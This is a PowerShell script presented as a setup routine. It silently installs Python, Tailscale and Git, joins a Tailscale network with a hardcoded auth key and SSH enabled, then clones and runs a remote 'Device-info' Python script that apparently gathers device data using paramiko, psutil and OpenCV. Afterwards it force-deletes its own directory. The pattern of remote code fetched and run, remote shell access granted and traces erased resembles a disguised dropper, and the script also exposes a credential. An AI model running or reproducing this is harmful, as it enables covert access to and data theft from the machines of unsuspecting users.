Write-Host "[*] Checking system requirements..."

# 1. Check if Python is installed
if (-not (Get-Command python3 -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Python not found. Installing Python..."
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.6/python-3.10.6-amd64.exe" -OutFile "python-installer.exe"
    Start-Process -FilePath "python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
    Remove-Item "python-installer.exe"
}

# 2. Check if Tailscale is installed
if (-not (Get-Command tailscale -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Tailscale not found. Installing Tailscale..."
    Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup.exe" -OutFile "tailscale-setup.exe"
    Start-Process -FilePath "tailscale-setup.exe" -ArgumentList "/quiet" -Wait
    Remove-Item "tailscale-setup.exe"
}

# 3. Start Tailscale and log in using the provided Auth Key
Write-Host "[*] Starting and logging into Tailscale using Auth Key..."
Start-Process -FilePath "tailscale" -ArgumentList "up --authkey tskey-auth-kUU5ZKrmid11CNTRL-tsTWq7PrzaSiaA5peBcfaSE2pTgSamjZU --ssh" -Wait

# 4. Check if Git is installed
if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Git not found. Installing Git..."
    Invoke-WebRequest -Uri "https://github.com/git-for-windows/git/releases/download/v2.42.0.windows.1/Git-2.42.0-64-bit.exe" -OutFile "git-setup.exe"
    Start-Process -FilePath "git-setup.exe" -ArgumentList "/silent" -Wait
    Remove-Item "git-setup.exe"
}

# 5. Clone the GitHub repository if it doesn't already exist
$cloneDir = "Device-info"
if (-not (Test-Path -Path $cloneDir)) {
    Write-Host "[*] Cloning the Device-info repository..."
    git clone https://github.com/uchihasosuke/Device-info.git $cloneDir
}

# 6. Change directory to the cloned repository
Set-Location -Path $cloneDir

# 7. Install OpenCV and system dependencies using pip
Write-Host "[*] Installing OpenCV and system dependencies..."
python -m pip install --upgrade pip
python -m pip install paramiko psutil opencv-python-headless socket uuid datetime re getpass

Write-Host "[*] Python packages installed successfully."

# 8. Run the Python script
Write-Host "[*] Running the device4.py script..."
python device4.py

# 9. Log out of Tailscale after successful completion
Write-Host "[*] Logging out of Tailscale..."
Start-Process -FilePath "tailscale" -ArgumentList "down" -Wait

Write-Host "[*] Tailscale session ended. Script completed successfully."

# 10. Delete the entire directory (the script file itself will be deleted as well)
Write-Host "[*] Deleting the entire script directory..."
$parentDir = (Get-Location).Path
Set-Location -Path ..
Remove-Item -Path $parentDir -Recurse -Force

Write-Host "[*] Directory deleted. Script execution completed successfully."
